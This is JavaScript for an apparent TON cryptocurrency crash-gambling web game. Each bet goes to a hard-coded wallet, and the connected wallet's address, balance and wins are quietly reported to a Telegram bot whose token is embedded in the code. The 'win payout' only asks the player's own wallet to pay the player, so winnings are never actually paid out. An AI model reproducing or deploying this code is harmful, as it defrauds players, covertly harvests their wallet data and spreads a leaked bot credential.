const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://imdontyou.github.io/casino/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

let walletAddress = null;
let gameRunning = false;
let multiplier = 1.00;
let gameInterval;
let betAmount = 0;
let rocketSpeedMultiplier = 0.05; // Начальная скорость прироста
let explosionChance = 0.02; // Начальная вероятность взрыва ракеты
const mainWallet = "UQCII3MvhR52dvWjRPXjWepxPUJfJ6Tq1c1u5Raq5d_51Oqx";

tonConnectUI.onStatusChange(async (walletInfo) => {
    if (walletInfo && walletInfo.account) {
        walletAddress = walletInfo.account.address;
        console.log('Адрес подключенного кошелька:', walletAddress);
        updateBalance(walletAddress);  // Обновить баланс при подключении
    }
});

async function updateBalance(walletAddress) {
    try {
        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
        const data = await response.json();
        if (!data.balance) return;

        const balanceTON = parseFloat(data.balance) / 1000000000;
        console.log(`Баланс: ${balanceTON} TON`);
        
        // Отображаем баланс в интерфейсе
        document.getElementById('wallet-balance').innerText = balanceTON.toFixed(2);
        
        // Также отправляем информацию в Telegram
        sendToTelegram(`💰 Баланс кошелька <code>${walletAddress}</code>: <b>${balanceTON} TON</b>`);
    } catch (error) {
        console.error('Ошибка при получении баланса:', error);
    }
}

async function startGame() {
    if (!walletAddress) return alert("Подключите кошелек!");
    
    betAmount = parseFloat(document.getElementById("betAmount").value);
    if (isNaN(betAmount) || betAmount <= 0) return alert("Введите корректную ставку!");

    // Отправка ставки
    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60,
        messages: [{ address: mainWallet, amount: betAmount * 1000000000 }],
        sendMode: 5
    };

    try {
        await tonConnectUI.sendTransaction(transaction);
        console.log(`Ставка ${betAmount} TON отправлена!`);
        updateBalance(walletAddress); // Обновление баланса после отправки
    } catch (error) {
        console.error("Ошибка при отправке TON:", error);
        return;
    }

    // Запуск игры
    gameRunning = true;
    multiplier = 1.00;
    document.getElementById("multiplier").innerText = multiplier.toFixed(2);

    // Случайным образом определяем скорость роста коэффициента и шанс взрыва ракеты
    rocketSpeedMultiplier = 0.05 + Math.random() * 0.05; // скорость может варьироваться от 0.05 до 0.3
    explosionChance = Math.min(0.02 + rocketSpeedMultiplier * 0.5, 0.2); // шанс взрыва увеличивается с ростом скорости

    let rocket = document.getElementById("rocket");
    rocket.style.transition = "bottom 2s ease-out";
    rocket.style.bottom = "50%"; // Поднятие до середины

    setTimeout(() => {
        rocket.style.transition = "bottom 0.2s ease-in-out";
        startShakingRocket(rocket);
        startFallingStars();
    }, 2000);

    // Задержка в 3 секунды перед запуском прироста коэффициента
    setTimeout(() => {
        gameInterval = setInterval(() => {
            if (!gameRunning) return;
            
            // Плавное увеличение коэффициента с использованием текущего мультипликатора скорости
            multiplier += rocketSpeedMultiplier; // Используем динамическую скорость

            document.getElementById("multiplier").innerText = multiplier.toFixed(2);

            // Повышаем вероятность взрыва ракеты с увеличением скорости роста коэффициента
            if (Math.random() < explosionChance * (multiplier / 2)) {
                endGame(false);
            }
        }, 50); // Уменьшаем интервал для более плавного обновления коэффициента
    }, 3000); // Начать прирост коэффициента через 3 секунды
}

function stopGame() {
    if (!gameRunning) return;
    endGame(true);
}

function endGame(isWin) {
    gameRunning = false;
    clearInterval(gameInterval);
    clearFallingStars();

    let rocket = document.getElementById("rocket");
    rocket.style.transition = "bottom 2s ease-in-out";
    rocket.style.bottom = "10px"; // Возвращаем ракету вниз

    if (isWin) {
        alert(`🎉 Вы выиграли! Ваш коэффициент: ${multiplier.toFixed(2)}x`);
        let winAmount = betAmount * multiplier;
        sendToTelegram(`✅ Игрок <code>${walletAddress}</code> выиграл <b>${winAmount.toFixed(2)} TON</b>`);
        sendWinTransaction(winAmount);
    } else {
        alert("🚀 Ракета взорвалась! Вы проиграли.");
    }
}

async function sendWinTransaction(amount) {
    if (!walletAddress) return;

    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60,
        messages: [{ address: walletAddress, amount: Math.floor(amount * 1000000000) }],
        sendMode: 5
    };

    try {
        await tonConnectUI.sendTransaction(transaction);
        console.log(`Выплачено ${amount.toFixed(2)} TON`);
        updateBalance(walletAddress);  // Обновляем баланс после выплаты
    } catch (error) {
        console.error("Ошибка при выплате выигрыша:", error);
    }
}

async function sendToTelegram(message) {
    const botToken = "7931684835:AAH9pSLLaLLqOqd40q6o6uUMsiRHVSrak7U";
    const chatId = "@ppjjkkd";

    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
        });
    } catch (error) {
        console.error("Ошибка отправки в Telegram:", error);
    }
}

// Тряска ракеты
function startShakingRocket(rocket) {
    let shakeInterval = setInterval(() => {
        if (!gameRunning) {
            clearInterval(shakeInterval);
            return;
        }
        let randomOffset = Math.random() * 10 - 5;
        rocket.style.bottom = `calc(50% + ${randomOffset}px)`;
    }, 200);
}

// Создание падающих звезд
function startFallingStars() {
    const gameContainer = document.querySelector(".game-container");
    
    for (let i = 0; i < 10; i++) {
        let star = document.createElement("img");
        star.src = "ton_logo.png";
        star.classList.add("falling-star");
        star.style.width = "50px";
        star.style.height = "50px";
        star.style.position = "absolute";
        star.style.left = `${Math.random() * 250}px`;
        star.style.top = "-50px";
        
        gameContainer.appendChild(star);
        animateStar(star);
    }
}

// Анимация падения звезд
function animateStar(star) {
    let speed = 2 + Math.random() * 3;
    
    function fall() {
        if (!gameRunning) {
            star.remove();
            return;
        }
        
        let currentTop = parseFloat(star.style.top) || 0;
        if (currentTop > 300) {
            star.style.top = "-50px";
            star.style.left = `${Math.random() * 250}px`;
        } else {
            star.style.top = `${currentTop + speed}px`;
        }

        requestAnimationFrame(fall);
    }

    fall();
}

// Очистка звезд при окончании игры
function clearFallingStars() {
    document.querySelectorAll(".falling-star").forEach(star => star.remove());
}
